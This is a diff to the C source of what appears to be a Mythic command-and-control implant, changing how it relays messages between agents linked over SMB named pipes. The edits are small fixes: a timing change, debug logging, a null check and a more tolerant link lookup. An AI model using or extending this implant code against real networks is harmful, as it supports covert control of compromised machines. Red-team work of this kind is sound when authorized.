@@ -138,7 +138,7 @@ BOOL LinkAddSmb( PCHAR TaskUuid, PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen, 
         }
 
         /* Parent was faster than Link, wait for data */
-        Sleep(100);
+        Sleep(500);
     }
 
 
@@ -350,7 +350,6 @@ BOOL LinkSync( PCHAR TaskUuid, PPARSER Response )
     if (NumOfParams == 0)
         return TRUE; // TODO: May be FALSE?
 
-    _dbg("[LINK SYNC] Buffer:");
 
     IsCheckin   = (BOOL)ParserGetByte(Response);
     LinkId      = ParserGetInt32(Response);
@@ -370,24 +369,20 @@ BOOL LinkSync( PCHAR TaskUuid, PPARSER Response )
         /* Update Mythic Agent ID If Checkin */
         if ( IsCheckin )
         {
+
             if ( Current->LinkId == LinkId )
             {
                 Current->AgentId = P2pUuid;
 
                 _dbg("[LINK SYNC] Updated Link Agent ID => [%s]", Current->AgentId);
-            }
-            else
-            {
-                _err("Failed to find the matching Link by LinkID");
-                goto CLEANUP;
-            }
+            } // If not, will check rest of linked-list
         }
         
-        
+        _dbg("[LINK SYNC] Checking current link : %s", Current->AgentId);
         /* Search by AgentId and Send Data */
         if ( strcmp(Current->AgentId, P2pUuid) == 0 )
         {
-            _dbg("[LINK SYNC] Syncing %d bytes to Link ID [%x]", MsgLen, Current->AgentId);
+            _dbg("[LINK SYNC] Syncing %d bytes to Link ID [%s]", MsgLen, Current->AgentId);
 
             DWORD BytesAvailable = 0;
             DWORD BytesRemaining = 0;
@@ -483,7 +478,7 @@ BOOL LinkSync( PCHAR TaskUuid, PPARSER Response )
 
 CLEANUP:
 
-    LocalFree(P2pMsg);
+    if (P2pMsg) LocalFree(P2pMsg);
     if ( !IsCheckin ) LocalFree(P2pUuid);
 
     return Success;
@@ -511,8 +506,6 @@ VOID LinkPush()
      * For each pivot, we loop up to MAX_SMB_PACKETS_PER_LOOP times
      * this is to avoid potentially blocking the parent agent
      */
-
-    _dbg("Pushing all Link messages to server! ");
 
     do
     {
@@ -765,8 +758,6 @@ BOOL LinkRemove( PCHAR P2pUuid )
     // Host    = ParserGetString(arguments, &hLen);
     P2pUuid = ParserGetString(arguments, &pLen);
 
-    _dbg("Unlinking P2P Agent [%s]", P2pUuid);
-
     PLINKS Current = xenonConfig->Links;
     while ( Current )
     {
@@ -774,6 +765,7 @@ BOOL LinkRemove( PCHAR P2pUuid )
 
         if ( strcmp(Current->AgentId, P2pUuid) == 0 )
         {
+            _dbg("Unlinking P2P Agent [%s]", P2pUuid);
             LinkType = Current->LinkType;
             break;
         }
